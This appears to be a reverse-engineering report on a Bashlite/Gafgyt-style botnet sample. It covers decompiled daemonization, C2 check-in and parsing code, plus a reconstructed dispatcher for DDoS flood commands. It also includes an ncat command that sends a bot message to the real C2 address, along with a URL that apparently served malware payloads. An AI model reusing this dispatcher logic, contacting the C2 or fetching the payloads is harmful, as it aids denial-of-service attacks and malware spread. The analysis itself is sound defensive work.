# Reverse Engineering Botnet (Bot123)

# Analysis Methods
## Reverse Engineering and Decompiling
### Omar

#### 1. Initialization Code L: 5505 -> 5527

```c
tVar4 = time((time_t *)0x0);
uVar1 = getpid();
srandom(uVar1 ^ (uint)tVar4);
```

- `tVar4 = time((time_t *)0x0);`
  - Calls the `time()` function with a `NULL` argument, which returns the current time in seconds since the Unix epoch.
  - The result is stored in `tVar4`.

- `uVar1 = getpid();`
  - Calls the `getpid()` function, which returns the process ID of the calling process.
  - The result is stored in `uVar1`.

- `srandom(uVar1 ^ (uint)tVar4);`
  - Calls the `srandom()` function to seed the random number generator.
  - The seed is generated by XOR-ing the process ID (`uVar1`) with the current time (`tVar4`).
  - This ensures that the random number sequence is different for each process and each run.

---


```c
tVar4 = time((time_t *)0x0);
uVar1 = getpid();
init_rand(uVar1 ^ (uint)tVar4);
```

- `tVar4 = time((time_t *)0x0);`
  - Again retrieves the current time.

- `uVar1 = getpid();`
  - Again retrieves the process ID.

- `init_rand(uVar1 ^ (uint)tVar4);`
  - Calls a function named `init_rand()` with the XOR of the process ID and current time as the argument.
  - This likely performs additional random number generator initialization, separate from `srandom()`.

---


```c
getOurIP();
```

- Calls the `getOurIP()` function.
- This function retrieves and stores the IP address of the machine the bot is running on.

---

```c
local_50 = fork();
if (local_50 != 0)
{
  waitpid(local_50, &local_6c, 0);
  exit(0);
}
```

- `local_50 = fork();`
  - Calls the `fork()` function to create a new child process.
  - The return value is stored in `local_50`.
    - If `fork()` returns 0, the code is running in the child process.
    - If it returns a positive value, the code is running in the parent process.

- `if (local_50 != 0)`
  - If in the parent process:
    - `waitpid(local_50, &local_6c, 0);`
      - Waits for the child process to finish.
    - `exit(0);`
      - Exits the parent process.

---


```c
local_54 = fork();
if (local_54 != 0)
{
  exit(0);
}
```

- `local_54 = fork();`
  - Forks again, creating a grandchild process.

- `if (local_54 != 0)`
  - If in the parent (the first child), exit immediately.
  - Only the grandchild process continues running.

---

```c
setsid();
```

- Calls `setsid()` to start a new session and detach from any controlling terminal.
- This makes the process a session leader and ensures it runs in the background as a daemon.

---

```c
chdir("/");
```

- Calls `chdir("/")` to change the current working directory to the root directory.
- This is a common practice for daemons to avoid locking the current directory.

---

```c
signal(0xd, (__sighandler_t)&_nl_current_LC_NUMERIC_used);
```

- Calls `signal()` to set a handler for signal number 13 (`SIGPIPE`).
- The handler is set to `_nl_current_LC_NUMERIC_used`.
- This line sets up how the process will handle the SIGPIPE signal.

---


##### Summary

This is known as Daemonization, which is a common practice for background processes. The code forks twice to create a child and grandchild process, ensuring that the daemon is not a session leader and is not attached to any terminal. It also sets up signal handling and changes the working directory.
This prevents the process from being terminated when the terminal closes and allows it to run independently in the background as well as make it less likely to be killed by the user by accident.


#### 2. Hello From Bot


The main loop of this program is designed to **maintain a persistent connection** to a command and control (C2) server. If the connection drops or fails, the program will **attempt to reconnect every 5 seconds**. This is implemented with a loop that calls `initConnection()` repeatedly, with a delay between attempts.


---

##### `initConnection()` Function L: 5439

This function is responsible for **establishing a connection** to the C2 server.

1. **Clear IP Buffer:**  
   `memset(ip, 0, 0x200);`  
   This clears the IP buffer to ensure no leftover data.

2. **Close Previous Socket:**  
   If a previous connection exists (`mainCommSock != 0`), it closes it.

3. **Select Server:**  
   The code supports multiple server addresses, but in this sample, only **one server is hardcoded**:  
   ```
   45.11.229.181:606
   ```
   The code increments `currentServer` to cycle through servers, but since only one is present, this is redundant.

4. **Parse IP and Port:**  
    - Copies the server address into `ip`.
    - Default port is set to `0x1b46` (6982 in decimal).
    - If the address contains a colon (`:`), it parses the port number after the colon (in this case, `606`), and removes the port from the IP string.
    - The code sets a **default port** (`6982`) if no port is specified in the address.
    - However, the only server address present is `45.11.229.181:606`, which **explicitly specifies a port** (`606`).
    - As a result, the default port logic is never used.
    - This is a strong indicator that the code was **copied from somewhere else** and not properly customized—likely by a low-skilled or careless individual.

5. **Create Socket and Connect:**  
   - Creates a TCP socket.
   - Calls `connectTimeout()` to attempt a connection to the parsed IP and port, with a 30-second timeout.

6. **Return Success/Failure:**  
   Returns `true` if the connection was successful, `false` otherwise.

##### First Hello Message From Bot L: 5534 -> 5538

```c
char *getArch(void)
{
  return "x86_64";
}
```
- **Always returns the string `"x86_64"`**.

---


```c
char *getPortz(void)
{
  int iVar1;
  char *pcVar2;

  iVar1 = access("/usr/bin/python", 0);
  if (iVar1 == -1)
  {
    iVar1 = access("/usr/bin/python3", 0);
    if (iVar1 == -1)
    {
      iVar1 = access("/usr/bin/perl", 0);
      if (iVar1 == -1)
      {
        iVar1 = access("/usr/sbin/telnetd", 0);
        if (iVar1 == -1)
        {
          pcVar2 = "Unknown Port";
        }
        else
        {
          pcVar2 = "22";
        }
      }
      else
      {
        pcVar2 = "22";
      }
    }
    else
    {
      pcVar2 = "22";
    }
  }
  else
  {
    pcVar2 = "22";
  }
  return pcVar2;
}
```

###### **What does this do?**
- It checks for the existence of several files (executables) in order:
  1. python
  2. python3
  3. perl
  4. `/usr/sbin/telnetd`
- If **any** of these exist, it returns `"22"`.
- If **none** exist, it returns `"Unknown Port"`.


---

In the main loop, the code does:

```c
achiteture = getArch();
our_port = getPortz();
ip = inet_ntoa(ourIP);
sockprintf(mainCommSock, "\x1b[1;95mDevice Connected: %s | Port: %s | Arch: %s\x1b[0m", ip, our_port, achiteture);
```

- `inet_ntoa(ourIP)` converts the bot's IP address to a string.
- `sockprintf` sends a formatted string to the C2 server.

###### **What does the message look like?**

**Format:**
```
\x1b[1;95mDevice Connected: <ip> | Port: <port> | Arch: <arch>\x1b[0m
```
- `\x1b[1;95m` and `\x1b[0m` are ANSI escape codes for colored terminal output (magenta, bold).

**Example (assuming IP is 192.168.1.10):**
```
\x1b[1;95mDevice Connected: 192.168.1.10 | Port: 22 | Arch: x86_64\x1b[0m
```

The strange sequence `\x1b[1;95m` is used to color the text in the terminal, I assume this is to make it look more appealing to the C2 operator.
I created an example file of what is sent to the C2 server, which can be found at `bot123/hello.bin` You can replace the placeholders with your own IP and send it to the server using ncat.

```bash
ncat 45.11.229.181 606 < bot123/hello.bin
```
This will send the message to the C2 server, and you should see a response from the server, however I didn't get a response when I sent the message, so it is possible that the server is down or not responding.


---

#### 3. Response from C2 Server L


##### recvLine() L: 2750
`recvLine` is a function that reads a line (ending with `\n`) from a socket (file descriptor), with a timeout and retry logic.

```c
int recvLine(int param_1, char *param_2, int param_3)
```
- `param_1`: socket file descriptor (`mainCommSock`)
- `param_2`: buffer to store the received line
- `param_3`: maximum buffer size


1. **Zero out the buffer:**  
   ```c
   memset(param_2, 0, (long)param_3);
   ```
   Ensures the buffer is clean.

2. **Set up a 30-second timeout:**  
   ```c
   local_c8.tv_sec = 0x1e; // 30 seconds
   local_c8.tv_usec = 0;
   ```

3. **Prepare the fd_set for select():**  
   - Zero out the fd_set.
   - Set the bit for the socket fd.

4. **Call `select()` to wait for data:**  
   ```c
   local_28 = select(param_1 + 1, &local_b8, (fd_set *)0x0, &local_b8, &local_c8);
   ```
   - Waits up to 30 seconds for data to be available for reading or an error.

5. **Retry logic:**  
   - If `select()` returns < 1 (timeout or error), it retries up to 10 times, each time resetting the timeout and fd_set.

6. **Read bytes one at a time:**  
   ```c
   while (1 < local_e0)
   {
       sVar4 = recv(mainCommSock, &local_c9, 1, 0);
       if (sVar4 != 1)
       {
           *local_18 = '\0';
           return -1;
       }
       pcVar1 = local_18 + 1;
       *local_18 = local_c9;
       local_18 = pcVar1;
       if (local_c9 == '\n')
           break;
       local_1c = local_1c + 1;
       local_e0 = local_e0 + -1;
   }
   ```
   - Reads one byte at a time from the socket.
   - Stops when it reads a newline (`\n`) or buffer is full.
   - If `recv()` fails, returns -1.

7. **Null-terminate the string and return the length.**



##### **Main Loop (Command Reception and Parsing)**

The main loop repeatedly calls `recvLine` to get commands from the server:

```c
while (bytes_received = recvLine(mainCommSock, buffer, 0x1000), bytes_received != -1)
{
    ...
    buffer[bytes_received] = 0;
    trim(buffer);
    string_index = buffer;
    if (buffer[0] == 0x21) // '!'
    {
        // Parse command
        ...
        processCmd(param_count, command_with_params);
        ...
    }
}
```

1. **Receive a line from the server:**  
   - `recvLine` is called, result stored in `buffer`.

2. **Null-terminate and trim:**  
   - `buffer[bytes_received] = 0;`
   - `trim(buffer);` (removes whitespace/newlines from ends)

3. **Check for command prefix:**  
   - If the first character is `'!'` (0x21), it's a command.

4. **Parse the command:**
   - Find the first space after `'!'` to separate the command name.
   - Null-terminate the command name.
   - The command name is uppercased.
   - The rest of the line is split into parameters using `strtok` with `" "` as delimiter.
   - Each parameter is copied into a newly allocated buffer and stored in `command_with_params[]`.

5. **Store command and parameters:**
   - `command_with_params[0]` = command name (uppercased)
   - `command_with_params[1..n]` = parameters (as strings)
   - `param_count` = number of parameters + 1 (command name)

6. **Call `processCmd`:**
   - Passes the parsed command and parameters for execution.

7. **Cleanup:**
   - Frees the memory allocated for each parameter after processing.

##### **Summary**
- The bot expects commands from the server to start with `'!'`.
- It parses the command name and parameters, uppercases the command, and stores them in an array.
- The command and its parameters are then passed to the command handler.

---

#### 4. **What does the bot do with its child processes?**


In the main loop, before parsing commands, there is this code:

```c
for (pid_index = 0; (ulong)(long)(int)pid_index < numpids; pid_index = pid_index + 1)
{
    _Var3 = waitpid(*(__pid_t *)((long)pids + (long)(int)pid_index * 4), (int *)0x0, 1);
    uVar1 = pid_index;
    if (0 < _Var3)
    {
        // Remove finished child from pids array
        while (local_20 = uVar1 + 1, local_20 < numpids)
        {
            *(undefined4 *)((ulong)uVar1 * 4 + (long)pids) =
                *(undefined4 *)((long)pids + (ulong)local_20 * 4);
            uVar1 = local_20;
        }
        *(undefined4 *)((long)pids + (ulong)uVar1 * 4) = 0;
        len_command = numpids * 4;
        numpids = numpids - 1;
        local_60 = malloc(len_command);
        for (local_20 = 0; local_20 < numpids; local_20 = local_20 + 1)
        {
            *(undefined4 *)((ulong)local_20 * 4 + (long)local_60) =
                *(undefined4 *)((long)pids + (ulong)local_20 * 4);
        }
        free(pids);
        pids = local_60;
    }
}
```


- The bot keeps track of child process IDs in an array (`pids`), with `numpids` being the count.
- For each child process, it calls `waitpid(pid, NULL, 1)` (non-blocking wait).
- If `waitpid` returns > 0, the child has exited.
- The code then removes the finished child's PID from the array:
    - Shifts the remaining PIDs down to fill the gap.
    - Decrements `numpids`.
    - Allocates a new array of the correct size, copies the remaining PIDs, and frees the old array.
- This keeps the `pids` array up-to-date with only active child processes.

**Why does it do this?**

- The bot likely forks child processes to handle attacks or other tasks.
- This code cleans up after finished children, preventing zombie processes and keeping the PID list accurate.

---


#### 5. **Command Processing** processCmd() L: 4773

- **Input:**  
  - `param_count`: Number of parameters in the command.
  - `params`: Array of pointers to parameters (strings).
- **Behavior:**  
  - Checks the first parameter (the command type, e.g., "TCP", "UDP", etc.).
  - Validates and parses the rest of the parameters.
  - For each supported command, forks a process and launches the corresponding attack function.
  - Supports multiple targets by splitting the target string on commas.
  - Has a "STOP" command to kill all child processes.


```c
void processCmd(int param_count, char **params) {
    char *cmd = params[0];

    // --- TCP Attack ---
    if (strcmp(cmd, "TCP") == 0) {
        if (param_count < 6) return;
        char *targets = params[1];
        int port = atoi(params[2]);
        int seconds = atoi(params[3]);
        int packetsize = atoi(params[4]);
        char *payload = params[5];
        int interval = (param_count == 8) ? atoi(params[7]) : 10;
        int spoof = (param_count >= 7) ? atoi(params[6]) : 0;

        // Multiple targets support
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                ftcp(tok, port, seconds, packetsize, payload, spoof, interval);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- UDP Attack ---
    if (strcmp(cmd, "UDP") == 0) {
        if (param_count < 6) return;
        int port = atoi(params[2]);
        int seconds = atoi(params[3]);
        int packetsize = atoi(params[4]);
        int interval = (param_count == 6) ? atoi(params[5]) : 10;
        if (port == -1 || seconds == -1 || packetsize == -1 || packetsize > 0x400 || interval < 1) return;

        char *targets = params[1];
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                SendUDP(tok, port, seconds, packetsize, interval, 0x20);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- VSE Attack ---
    if (strcmp(cmd, "VSE") == 0) {
        if (param_count < 6) return;
        int port = atoi(params[2]);
        int seconds = atoi(params[3]);
        int packetsize = atoi(params[4]);
        int count = atoi(params[5]);
        if (port == -1 || seconds == -1 || packetsize == -1 || count == -1 || count > 0x10000 || count > 0xffdc || packetsize > 0x20) return;
        int interval = (param_count >= 7) ? atoi(params[6]) : 1000;
        int delay = (param_count >= 8) ? atoi(params[7]) : 1000000;
        int spoof = (param_count >= 9) ? atoi(params[8]) : 0;

        char *targets = params[1];
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                vseattack(tok, port, seconds, packetsize, count, interval, delay, spoof);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- STDHEX Attack ---
    if (strcmp(cmd, "STDHEX") == 0) {
        if (param_count < 4) return;
        int seconds = atoi(params[2]);
        int packetsize = atoi(params[3]);
        if (seconds < 1 || packetsize < 1) return;

        char *targets = params[1];
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                SendSTDHEX(tok, seconds, packetsize);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- STD Attack ---
    if (strcmp(cmd, "STD") == 0) {
        if (param_count < 4) return;
        int seconds = atoi(params[2]);
        int packetsize = atoi(params[3]);
        if (seconds < 1 || packetsize < 1) return;

        char *targets = params[1];
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                SendSTD(tok, seconds, packetsize);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- NFODROP Attack ---
    if (strcmp(cmd, "NFODROP") == 0) {
        if (param_count < 4) return;
        int seconds = atoi(params[2]);
        int packetsize = atoi(params[3]);
        if (seconds < 1 || packetsize < 1) return;

        char *targets = params[1];
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                stdhexflood(tok, seconds, packetsize);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- OVHKILL Attack ---
    if (strcmp(cmd, "OVHKILL") == 0) {
        if (param_count < 4) return;
        int seconds = atoi(params[2]);
        int packetsize = atoi(params[3]);
        if (seconds < 1 || packetsize < 1) return;

        char *targets = params[1];
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                SendSTD_HEX(tok, seconds, packetsize);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- XMAS Attack ---
    if (strcmp(cmd, "XMAS") == 0) {
        if (param_count < 4) return;
        int packetsize = atoi(params[3]);
        if (packetsize > 10000) return;

        char *targets = params[1];
        int seconds = atoi(params[2]);
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                rtcp(tok, seconds, packetsize, 0x20, 0x400, 10);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- CRUSH Attack ---
    if (strcmp(cmd, "CRUSH") == 0) {
        if (param_count < 6) return;
        int port = atoi(params[2]);
        int seconds = atoi(params[3]);
        int packetsize = atoi(params[4]);
        char *payload = params[5];
        if (port == -1 || seconds == -1 || packetsize == -1 || packetsize > 0x20) return;
        int spoof = (param_count >= 7) ? atoi(params[6]) : 0;
        int interval = (param_count == 8) ? atoi(params[7]) : 10;

        char *targets = params[1];
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                astd(tok, port, seconds, 0x5b4);
                atcp(tok, port, seconds, packetsize, payload, spoof, interval);
                close(mainCommSock);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- STOMP Attack ---
    if (strcmp(cmd, "STOMP") == 0) {
        if (param_count < 6) return;
        int port = atoi(params[2]);
        int seconds = atoi(params[3]);
        int packetsize = atoi(params[4]);
        char *payload = params[5];
        if (port == -1 || seconds == -1 || packetsize == -1 || packetsize > 0x20) return;
        int spoof = (param_count >= 7) ? atoi(params[6]) : 0;
        int interval = (param_count == 8) ? atoi(params[7]) : 10;

        char *targets = params[1];
        char *tok = strtok(targets, ",");
        do {
            if (listFork() == 0) {
                astd(tok, port, seconds, spoof);
                audp(tok, port, seconds, packetsize, spoof, interval);
                atcp(tok, port, seconds, packetsize, payload, spoof, interval);
                close(mainCommSock);
                _exit(0);
            }
        } while ((tok = strtok(NULL, ",")) != NULL);
        return;
    }

    // --- STOP Command ---
    if (strcmp(cmd, "STOP") == 0) {
        for (ulong i = 0; i < numpids; i++) {
            pid_t pid = pids[i];
            if (pid != 0 && pid != getpid()) {
                kill(pid, 9);
            }
        }
        return;
    }
}
```

---

##### **Key Points**

- **Forking:**  
  Each attack is run in a child process (`listFork()`), so the main process can continue to accept commands.
- **Multiple Targets:**  
  If the target parameter contains commas, it splits and attacks each target in a separate process.
- **Parameter Validation:**  
  Each command checks for valid parameter counts and values before launching attacks.
- **STOP Command:**  
  Kills all child processes except itself.

---

Attack method available in Bot123

| Function Name          | Command | Description                                                                                   | Present in Recent Bashlite Forks |
|-----------------------|---------|-----------------------------------------------------------------------------------------------|---------------------------------|
| ftcp                  | TCP     | Customizable TCP flood attack                                                                | ✔                               |
| SendUDP               | UDP     | UDP flood attack                                                                             | ✔                               |
| vseattack             | VSE     | UDP amplification attack for Valve Source Engine game servers                               | ✔                               |
| SendSTDHEX            | STDHEX  | Simple TCP flood attack with malformed hex payload                                          | ❌                              |
| SendSTD               | STD     | Simple TCP flood attack                                                                      | ✔                               |
| stdhexflood           | NFODROP | Simple TCP flood attack with large garbage payload                                          | ❌                              |
| SendSTD_HEX           | OVHKILL | Simple TCP flood attack likely directed at DayZ game servers                                | ✔                               |
| rtcp                  | XMAS    | Simple TCP flood attack with specific TCP flags set, resembling Xmas attack.                 | ✔                               |
| astd and atcp         | CRUSH   | Attack combining simple TCP flood and customizable TCP flood.                               | ✔                               |
| astd, atcp and audp   | STOMP   | Mixed flooding attack using simple/customizable TCP and UDP                                | ✔                               |
| kill                  | STOP    | Stops all attacks                                                                            | ✔                               |



## Virus Total Report

https://www.virustotal.com/gui/ip-address/45.11.229.181/relations Shows which files were communicating with this IP-Address. We can also observe in this list a shell script, sakura.sh.

This script atempts to change its currecnt directory and then proceedes to download several files. These files are likely some of the payload that our bot is atempting to gather as well:

```
- 'm-i.p-s.Sakura`
- `m-p.s-l.Sakura`
- `s-h.4-.Sakura`
- `x-8.6-.Sakura`
- `a-r.m-6.Sakura`
- `x-3.2-.Sakura`
- `a-r.m-7.Sakura`
- `p-p.c-.Sakura`
- `i-5.8-6.Sakura`
- `m-6.8-k.Sakura`
- `a-r.m-4.Sakura`
- `a-r.m-5.Sakura`
```


## Dynamic Analysis
### Any.run Results
The results of running the program on Any.run can be found [here](https://any.run/report/3b1be8499ec382dfafbc496a73dea2794f6dd201b3e46a4128c7fcd88e8c17c2/32322955-6166-4ee8-9440-baa59267c993), when using a proxy a slightly different result can be found [here](https://any.run/report/963a062aa8d6950fa219284859f9c6dc527eb69480b78fd614bd6959d604e7a1/e10b7092-359e-45eb-957a-d520ce6a8e28)

### GDB Results

# Interseting Parts in the Decompiled Code

The processCmd() function is where the inbound commands from the command server are getting turned into function calls. Drilling into this function we can observe how the commands are processed.

There are multiple command cases that this function deals with, based on the input command name. The options are as follows:

- `TCP`
- `UDP`
- `VSE`
- `STDHEX`
- `STD`
- `NFODROP`
- `OVHKILL`
- `XMAS`
- `CRUSH`
- `STOMP`
- `STOP`

It has the ability to parse all the input commands and fork each command off into parallel helper functions that will actually execute what each command does.

Bellow is a breakdown of each of the possible commands:

#### TCP

```c
if (strcmp(commands[0], "TCP") == 0) {
    //Ensure there are at least 6 tokens:
    //commands[0] = "TCP"
    //commands[1] = target(s)
    //commands[2] = port
    //commands[3] = thread count
    //commands[4] = packet size
    //commands[5] = payload
    if (num_of_tokens < 6) {
        return;
    }

    // comma-separated IP(s)
    char *target_list   = commands[1];

    // target TCP port           
    int   port          = atoi(commands[2]);

    // number of parallel threads     
    int   thread_count  = atoi(commands[3]);

    // size of each packet     
    int   packet_size   = atoi(commands[4]);

    // extra data to include in the packet     
    char *payload       = commands[5];           

    // If statement which controls duration in seconds, if none provided default to 10 seconds.
    int duration = (num_of_tokens == 8) ? atoi(commands[7]) : 10;

    // If statement which controls inter-packet delay in milliseconds, if none provided default to 0ms.
    int delay = (num_of_tokens >= 7) ? atoi(commands[6]) : 0;

    // Check how many targets have been selected for the attack, single vs multiple
    char *commaPos = strchr(target_list, ',');
    if (commaPos == NULL) {
        // Single target case, also where listFork() is invoked which forks off the process to a child
        int fork_result = listFork();
        if (fork_result != 0) {
            return;
        }
        // Child runs the flood after the fork
        ftcp(target_list,
             port,
             thread_count,
             packet_size,
             payload,
             delay,
             duration);
        _exit(0);
    } else {
        // Multiple target case.
        char *target = strtok(target_list, ",");
        while (target != NULL) {
            // Starts forking off all the targets to a different child
            int fork_result = listFork();
            if (fork_result == 0) {
                // Child handles its specific target
                ftcp(target,
                     port,
                     thread_count,
                     packet_size,
                     payload,
                     delay,
                     duration);
                _exit(0);
            }
            // Parent moves on to the next target
            target = strtok(NULL, ",");
        }
    }
}
```

#### UDP

```c
if (strcmp(commands[0], "UDP") == 0) {
    //Ensure there are at least 6 tokens:
    //commands[0] = "UDP"
    //commands[1] = target(s)
    //commands[2] = port
    //commands[3] = thread count
    //commands[4] = packet size
    //commands[5] = duration
    if (num_of_tokens < 6) {
        return;
    }

    // comma-separated IP(s)
    char *target_list   = commands[1];

    // target UDP port
    int   port          = atoi(commands[2]);

    // number of parallel threads
    int   thread_count  = atoi(commands[3]);

    // size of each packet
    int   packet_size   = atoi(commands[4]);

    // If statement which controls duration in seconds, if none provided default to 10 seconds.
    int duration = (num_of_tokens == 6) ? atoi(commands[5]) : 10;

    // Check how many targets have been selected for the attack, single vs multiple
    char *commaPos      = strchr(target_list, ',');
    if (commaPos == NULL) {
        // Single target case, also where listFork() is invoked which forks off the process to a child
        int fork_result = listFork();
        if (fork_result != 0) {
            return;
        }
        // Child runs the flood after the fork
        SendUDP(target_list,
                port,
                thread_count,
                packet_size,
                duration,
                0x20);
        _exit(0);
    } else {
        // Multiple target case.
        char *target = strtok(target_list, ",");
        while (target != NULL) {
            // Starts forking off all the targets to a different child
            int fork_result = listFork();
            if (fork_result == 0) {
                // Child handles its specific target
                SendUDP(target,
                        port,
                        thread_count,
                        packet_size,
                        duration,
                        0x20);
                _exit(0);
            }
            // Parent moves on to the next target
            target = strtok(NULL, ",");
        }
    }
}
```

# Bot behaviour

#### C2

We can observe that ourbotnet atempts to communicate with the C2 server at 45.11.229.181:606. This is a known endpoint for Gafgyt botnet variants used for coordinated DDoS attacks. However this specific server seems to be unresponsive and offline currently as current atempts to communicate with it result in a timeout. 

![Any.run](https://i.imgur.com/EkZ1fv2.jpeg) 

Any.run dynamic analysis captures the packet sent out from our sample, we can recreate this packet and atempt to communicate with the C2 server however it ends up in a timeout which indicates the server is currently dead.

![CMD test](https://i.imgur.com/9QCyN64.png) 


https://threatfox.abuse.ch/ioc/1460615/ - Flags it as a botnet endpoint linked to the Bashlite malware.

https://urlhaus.abuse.ch/url/3491280/ - Shows that ```http://45.11.229.181/a-r.m-6.Sakura``` was used to serve malware, probably the payload host.

# Python Remake
